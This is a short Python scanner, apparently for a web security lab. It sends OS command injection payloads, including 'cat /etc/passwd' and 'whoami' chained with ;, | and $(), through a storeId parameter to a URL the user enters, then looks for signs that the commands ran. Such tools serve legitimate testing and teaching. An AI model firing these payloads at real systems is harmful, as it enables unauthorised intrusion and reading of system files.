import requests

# Define a list of payloads for visible OS command injection
visible_payloads = [
    '1|whoami',
    '1|id',
    '1|uname -a',
    '1;whoami',
    '1;id',
    '1;uname -a',
    '1&&whoami',
    '1&&id',
    '1&&uname -a',
    '1`whoami`',
    '1$(whoami)',
    '1;cat /etc/passwd',
    '1|cat /etc/passwd',
    '1&&cat /etc/passwd',
    '1|ls',
    '1;ls',
    '1&&ls',
]

def test_visible_injection(base_url, payloads):
    results = []
    detected_payloads = []
    for payload in payloads:
        params = {'productId': '4', 'storeId': payload}  # Adjusting parameters according to the lab
        response = requests.get(base_url, params=params)

        if response.status_code == 200:
            response_text = response.text.lower()
            # Check for indicators of command execution
            if 'uid=' in response_text or 'gid=' in response_text or 'root' in response_text or 'whoami' in response_text:
                results.append(f'OS command injection detected with payload: {payload}')
                detected_payloads.append(payload)
                print(f"Detected payload: {payload}")  # Debugging line
    if not results:
        results.append('[-] No OS command injection vulnerabilities detected.')
    return results, detected_payloads

def scan_os_command_injection(url):
    results, payloads = test_visible_injection(url, visible_payloads)
    return results, payloads

if __name__ == "__main__":
    user_url = input('Enter the URL to test for OS command injection: ')
    print("Scanning for OS Command Injection...")
    results, payloads = scan_os_command_injection(user_url)
    for result in results:
        print(result)
    for payload in payloads:
        print(f'Payload used: {payload}')
